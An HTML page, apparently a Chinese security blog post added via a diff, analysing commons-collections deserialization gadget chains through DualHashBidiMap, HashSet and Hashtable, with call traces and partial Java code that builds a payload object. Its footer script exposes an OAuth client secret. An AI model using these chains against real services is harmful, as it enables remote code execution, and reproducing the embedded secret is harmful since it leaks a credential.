@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        反序列化Map触发方式整理之DualHashBidiMap(有部分利用链未写完 有空补充) - Daybr4ak&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> sometimes code, sometimes hack. </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar">
+            <img src="/img/Daybreak.png" />
+        </div>
+        <div class="name">
+            <i>Daybr4ak</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简述"><span class="toc-text">简述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#简单回顾"><span class="toc-text">简单回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DualHashBidiMap"><span class="toc-text">DualHashBidiMap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashSet"><span class="toc-text">HashSet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashtable"><span class="toc-text">Hashtable</span></a></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+        <div class="index-about-mobile">
+            <i> sometimes code, sometimes hack. </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        反序列化Map触发方式整理之DualHashBidiMap(有部分利用链未写完 有空补充)
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2021-03-02 09:36:26</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#java" title="java">java</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>​    本文主要整理在反序列化利用链中通过Map.get()方式触发的函数，并进行流程分析。希望通过对多个触发流程的分析可以给大家更清晰了解如何构造出可利用的反序列化链，并在以后的审计中挖掘出新的利用链。</p>
+<h2 id="简单回顾"><a href="#简单回顾" class="headerlink" title="简单回顾"></a>简单回顾</h2><p>​    针对于commons-collections系列的利用链目前构造的主要思路是通过LazyMap.get()方法进行调用transformer.transform来触发ChainedTransformer、InvokerTransformer进行反射来打到Runtime.getRuntime.exec()的目的。基本核心为TiedMapEntry-&gt;hashCode()/toString() 触发到LazyMap-&gt;get()。可以看到LazyMap.get()的核心内容如下图所示：</p>
+<p><img src="./反序列化Map触发方式整理/image-20210302100717442.png" alt="image-20210302100717442"></p>
+<p>所以在挖掘的时候我们可以缩小目标到寻找一个Map，在这个Map中，调用了transformer.transform，并且transformer的值可控。便可进一步修改整个利用链达到自己的目的。</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>​    在找寻这类方法时要满足两个条件：</p>
+<p>​    1、因为是反序列化漏洞的利用，因此我们寻找的函数需要继承于Serializable满足可被序列化的条件。</p>
+<p>​    2、在重写的readObject()中需要调用一些方法来触发之后的流程。这个在后续分析中可以更清晰的理解。</p>
+<p>通过利用链中调用的Map类以此分析理解整体的构造流程。</p>
+<h3 id="DualHashBidiMap"><a href="#DualHashBidiMap" class="headerlink" title="DualHashBidiMap"></a>DualHashBidiMap</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">利用条件：</span><br><span class="line">commons-collections-<span class="number">3.1</span><span class="selector-class">.jar</span> or commons-collections-<span class="number">3.2</span>.<span class="number">1</span>.jar</span><br><span class="line"></span><br><span class="line">触发过程：</span><br><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.bidimap</span><span class="selector-class">.DualHashBidiMap-</span>&gt;readObject()</span><br><span class="line">	org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.bidimap</span><span class="selector-class">.DualHashBidiMap-</span>&gt;putAll()</span><br><span class="line">		org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.bidimap</span><span class="selector-class">.DualHashBidiMap-</span>&gt;put()</span><br><span class="line">			java<span class="selector-class">.util</span><span class="selector-class">.HashMap-</span>&gt;containsKey()</span><br><span class="line">				java<span class="selector-class">.util</span><span class="selector-class">.HashMap-</span>&gt;hash()</span><br><span class="line">					org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.keyvalue</span><span class="selector-class">.TiedMapEntry-</span>&gt;hashCode()</span><br><span class="line">						org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.keyvalue</span><span class="selector-class">.TiedMapEntry-</span>&gt;getValue()</span><br><span class="line">							org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.keyvalue</span><span class="selector-class">.LazyMap-</span>&gt;get()</span><br></pre></td></tr></table></figure>
+<p>首先看到DualHashBidiMap类在重写readObject()方法的时候调用了一个putAll()方法，进一步跟入。</p>
+<p><img src="./反序列化Map触发方式整理/image-20210302101952009.png" alt="image-20210302101952009"></p>
+<p>可以看到这里调用了put()方法进行了this.maps[].containsKey()方法调用。</p>
+<p><img src="./反序列化Map触发方式整理/image-20210302102334576.png" alt="image-20210302102334576"></p>
+<p>通过查看HashMap()的方法我们可以看到，在HashMap.containsKey()方法中进行了hash(key)的操作。而在该方法中进行了key.hashCode()方法的调用。</p>
+<p><img src="./反序列化Map触发方式整理/image-20210302102835076.png" alt="image-20210302102835076"></p>
+<p>进一步观察TiedMapEntry这个类我们可以看到在该类的方法中有三个函数均调用了getValue()操作，也就是说这三个方法在构造时我们都可以利用。</p>
+<p><img src="./反序列化Map触发方式整理/image-20210302103212596.png" alt="image-20210302103212596"></p>
+<p>在该类的getValue()方法中调用了this.map.get(this.key)方法。</p>
+<p>至此我们走到了利用链的最后一环也就是文章开头所说的CC系列的transformer调用触发点。</p>
+<p>整个利用链调用的类已经看完了接下来简单说明下构造所要做的事情。</p>
+<p>首先需要生成一个DualHashBidiMap()作为反序列化调用in.readObject()的入口出发点。当反序列化触发的时候会调用putAll方法()该方法接受一个Map参数，进一步调用put()方法 因为后续要触发HashMap.containsKey()方法，在put方法中调用的是this.map[0].containsKey(key) 也就是说我们开始构造DualHashBidiMap()时就需要生成一个HashMap()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">DualHashBidiMap</span><span class="params">(Map normalMap, Map reverseMap, BidiMap inverseBidiMap)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(normalMap, reverseMap, inverseBidiMap);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>而在这里该类构造方法时是一个protected方法，所以我们需要通过反射进行调用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class cls = Class.forName(<span class="string">"org.apache.commons.collections.bidimap.DualHashBidiMap"</span>);</span><br><span class="line">Constructor ctor = cls.getDeclaredConstructor(Map.class, Map.class, BidiMap.class);</span><br><span class="line">ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object payload_instance = m_ctor.newInstance([Map], <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>
+<p>在上面说到构造时我们需要传入一个HashMap()，由于在后续需要触发到TiedMapEntry.hashcode()在上面代码分析中我们知道HashMap会调用key.HashCode()方法，因此我们要将HashMap的key设置为TiedMapEntry。又因为需要到LazyMap.get()而这里的也就是说需要在构造TiedMapEntry时将map设置为LazyMap。同时为了触发transformer需要在构造LazyMap时设置factory为transformer类型。至此利用链构造成功。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Map lazyMap = LazyMap.decorate(<span class="keyword">new</span> HashMap(), transformerChain);</span><br><span class="line">TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"haha"</span>);</span><br><span class="line">    </span><br><span class="line">Map&lt;String, Object&gt; hashMap = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">hashMap.put(<span class="string">"test"</span>, entry);</span><br><span class="line"></span><br><span class="line">Class cls = Class.forName(<span class="string">"org.apache.commons.collections.bidimap.DualHashBidiMap"</span>);</span><br><span class="line">Constructor ctor = cls.getDeclaredConstructor(Map.class, Map.class, BidiMap.class);</span><br><span class="line">ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object payload_instance = m_ctor.newInstance(hashMap, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">利用条件：</span><br><span class="line">commons-collections-<span class="number">3.1</span>.jar</span><br><span class="line"></span><br><span class="line">触发过程：</span><br><span class="line">java<span class="selector-class">.util</span><span class="selector-class">.HashSet-</span>&gt;readObject()</span><br><span class="line">	java<span class="selector-class">.util</span><span class="selector-class">.HashMap-</span>&gt;put()</span><br><span class="line">		java<span class="selector-class">.util</span><span class="selector-class">.HashMap-</span>&gt;hash()</span><br><span class="line">			org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.keyvalue</span><span class="selector-class">.TiedMapEntry-</span>&gt;hashCode()</span><br><span class="line">				org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.keyvalue</span><span class="selector-class">.TiedMapEntry-</span>&gt;getValue()</span><br><span class="line">					org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.map</span><span class="selector-class">.LazyMap-</span>&gt;get()</span><br></pre></td></tr></table></figure>
+<h3 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">利用条件：</span><br><span class="line">commons-collections-<span class="number">3.1</span><span class="selector-class">.jar</span> - commons-collections-<span class="number">3.2</span>.<span class="number">1</span><span class="selector-class">.jar</span> </span><br><span class="line"></span><br><span class="line">触发过程：</span><br><span class="line">java<span class="selector-class">.util</span><span class="selector-class">.Hashtable-</span>&gt;readObject()</span><br><span class="line">	java<span class="selector-class">.util</span><span class="selector-class">.Hashtable-</span>&gt;reconstitutionPut()</span><br><span class="line">		org<span class="selector-class">.apache</span><span class="selector-class">.commons-</span>&gt;collections<span class="selector-class">.map</span><span class="selector-class">.AbstractMapDecorator</span><span class="selector-class">.equals</span>()</span><br><span class="line">			java<span class="selector-class">.util</span><span class="selector-class">.AbstractMap-</span>&gt;equals()</span><br><span class="line">				org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.map</span><span class="selector-class">.LazyMap-</span>&gt;get()</span><br><span class="line"></span><br><span class="line">java<span class="selector-class">.util</span><span class="selector-class">.HashSet-</span>&gt;readObject()</span><br><span class="line">	java<span class="selector-class">.util</span><span class="selector-class">.HashMap-</span>&gt;put()</span><br><span class="line">		java<span class="selector-class">.util</span><span class="selector-class">.HashMap-</span>&gt;hash()</span><br><span class="line">			org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.keyvalue</span><span class="selector-class">.TiedMapEntry-</span>&gt;hashCode()</span><br><span class="line">				org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.keyvalue</span><span class="selector-class">.TiedMapEntry-</span>&gt;getValue()</span><br><span class="line">					org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.map</span><span class="selector-class">.LazyMap-</span>&gt;get()</span><br></pre></td></tr></table></figure>
+
+        
+            <div class="donate-container">
+    <div class="donate-button">
+        <button id="donate-button">赞赏</button>
+    </div>
+    <div class="donate-img-container hide" id="donate-img-container">
+        <img id="donate-img" src="" data-src="/img/pay.jpg">
+        <p> 感谢鼓励 </p>
+    </div>
+</div>
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://github.com/daybr4ak">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-github"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a href="http://pupiles.com">pupil</a></span>
+        <span>/</span>
+        
+        <span><a href="https://www.cnblogs.com/test404/">胖虎</a></span>
+        <span>/</span>
+        
+        <span><a href="https://gloxec.github.io/">hook</a></span>
+        <span>/</span>
+        
+        <span><a href="https://drops.org.cn/">Ra1ndr0op</a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+	    总访问量
+            <span id="busuanzi_value_site_pv"></span>次
+        </span>
+        <span id="busuanzi_container_site_uv">
+	    总访客
+            <span id="busuanzi_value_site_uv"></span>人
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+
+<script src="/js/gitment.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+
+    // gitalk的主要参数
+        clientID: 'b2b890dbf29d011e8a47',
+        clientSecret: '45618d62e41c62c53ade7486ace5265af874fc5f',
+        repo: 'daybr4ak.github.io',
+        owner: 'daybr4ak',
+        admin: ['Daybr4ak'],
+        id: '反序列化Map触发方式整理之DualHashBidiMap(有部分利用链未写完 有空补充)',
+    
+    });
+    gitalk.render('comment-container');
+</script>
+<!-- <script>
+    var gitalk = new Gitalk({
+        id: '反序列化Map触发方式整理之DualHashBidiMap(有部分利用链未写完 有空补充)',
+        owner: 'daybr4ak',
+        repo: 'daybr4ak.github.io',
+        oauth: {
+            client_id: 'b2b890dbf29d011e8a47',
+            client_secret: '45618d62e41c62c53ade7486ace5265af874fc5f',
+        },
+    })
+    gitment.render('comment-container')
+</script> -->
+
+
+
+
+</html>
